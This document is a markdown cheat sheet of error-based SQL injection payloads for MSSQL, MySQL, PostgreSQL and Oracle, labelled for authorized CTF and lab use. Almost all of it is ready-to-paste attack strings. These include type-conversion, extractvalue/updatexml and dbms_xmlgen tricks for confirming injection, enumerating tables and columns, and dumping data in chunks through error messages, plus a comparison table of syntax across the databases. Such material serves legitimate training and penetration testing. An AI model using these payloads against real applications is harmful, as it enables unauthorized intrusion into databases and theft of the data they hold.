# Error-Based SQL Injection Cheat Sheet

> For authorized CTF / lab use only.

---

## MSSQL (Microsoft SQL Server)

### Confirm injection
```sql
-- Type conversion error — leaks value in error message
CONVERT(int, @@version)

-- Alternative using CAST
CAST(@@version AS int)
```

### Get DB info
```sql
-- Database name
CONVERT(int, db_name())

-- Current user
CONVERT(int, system_user)
```

### Enumerate tables
```sql
-- First table
CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))

-- Paginate — add found names to NOT IN list
CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN ('products')))
```

### Enumerate columns
```sql
-- First column of target table
CONVERT(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='TARGET'))
```

### Extract data
```sql
-- Dump a value
CONVERT(int,(SELECT TOP 1 col_name FROM target_table))

-- CASE WHEN wrapper — use in sort/order parameters
CASE WHEN (1=2) THEN id ELSE CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) END

-- WHERE clause injection — use in name/search parameters
' OR 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
```

> **Error leaks value between quotes:**
> `Conversion failed when converting the nvarchar value 'FLAG{abc123}' to data type int.`

---

## MySQL / MariaDB

> ⚠ MySQL's `CAST()` returns null instead of erroring. Use `extractvalue()` or `updatexml()` instead.

### ExtractValue() method
```sql
-- Version — invalid XPath triggers the error
extractvalue(1,concat(0x7e,version()))

-- Database name
extractvalue(1,concat(0x7e,database()))

-- First table
extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))

-- Second table (increment LIMIT offset)
extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))
```

### UpdateXML() method
```sql
-- Alternative to ExtractValue
updatexml(1,concat(0x7e,(SELECT version())),1)

-- Table name via UpdateXML
updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1)
```

### Extract data
```sql
-- Dump column value
extractvalue(1,concat(0x7e,(SELECT col FROM target_table LIMIT 0,1)))

-- Long values — extract in 30-char chunks
extractvalue(1,concat(0x7e,substring((SELECT col FROM target_table LIMIT 0,1),1,30)))

-- WHERE clause injection
' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
```

> `0x7e` = `~` delimiter. Avoid starting the XPath with `/` `.` `@` or a fully alphanumeric string — those are valid XPath and won't error.

---

## PostgreSQL

### Confirm injection
```sql
-- Type cast error
CAST(version() AS int)
```

### Get DB info
```sql
-- Version — use version() not @@version
CAST(version() AS int)

-- Current database
CAST(current_database() AS int)

-- Current user
CAST(current_user AS int)
```

### Enumerate tables
```sql
-- First table
CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)

-- Paginate using OFFSET
CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET 1) AS int)
```

### Extract data
```sql
-- Dump a value
CAST((SELECT col FROM target_table LIMIT 1) AS int)

-- WHERE clause injection
' OR 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--
```

> Key difference from MSSQL: use `version()` not `@@version`, and paginate with `LIMIT 1 OFFSET n` instead of `TOP 1 ... NOT IN`.

---

## Oracle

> ⚠ Oracle uses `dbms_xmlgen.getxml()` with an invalid column name to trigger errors. Column names are limited to 30 chars — always use `substr()`.

### Core technique
```sql
-- Version via dbms_xmlgen — invalid column name triggers error
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT banner FROM v$version WHERE rownum=1),1,30)||'" from sys.dual'))
```

### Get DB info
```sql
-- Current user
to_char(dbms_xmlgen.getxml('select "'||user||'" from sys.dual'))
```

### Enumerate tables
```sql
-- First table
to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE rownum=1)||'" from sys.dual'))

-- Paginate via NOT IN
to_char(dbms_xmlgen.getxml('select "'||(SELECT table_name FROM all_tables WHERE table_name NOT IN ('KNOWN_TABLE') AND rownum=1)||'" from sys.dual'))
```

### Extract data
```sql
-- Dump value — substr keeps under 30-char limit
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),1,30)||'" from sys.dual'))

-- Next 30 chars
to_char(dbms_xmlgen.getxml('select "'||substr((SELECT col FROM target_table WHERE rownum=1),31,30)||'" from sys.dual'))
```

> Use `||` for string concat (not `+` or `concat()`). Always wrap inner query values in `substr(,1,30)` — Oracle enforces a 30-char column name limit.

---

## Quick Reference — Syntax Differences

| Goal | MSSQL | MySQL | PostgreSQL | Oracle |
|---|---|---|---|---|
| Version | `@@version` | `version()` | `version()` | `v$version` |
| Error trigger | `CONVERT(int,x)` | `extractvalue()` | `CAST(x AS int)` | `dbms_xmlgen` |
| String concat | `'a'+'b'` | `concat(a,b)` | `'a'\|\|'b'` | `'a'\|\|'b'` |
| First row | `TOP 1` | `LIMIT 0,1` | `LIMIT 1` | `rownum=1` |
| Paginate | `NOT IN (...)` | `LIMIT n,1` | `LIMIT 1 OFFSET n` | `NOT IN (...)` |
| Tables meta | `information_schema` | `information_schema` | `information_schema` | `all_tables` |
| Comment | `-- or /**/` | `-- or #` | `--` | `--` |
| Substring | `SUBSTRING(x,1,30)` | `substring(x,1,30)` | `substring(x,1,30)` | `substr(x,1,30)` |
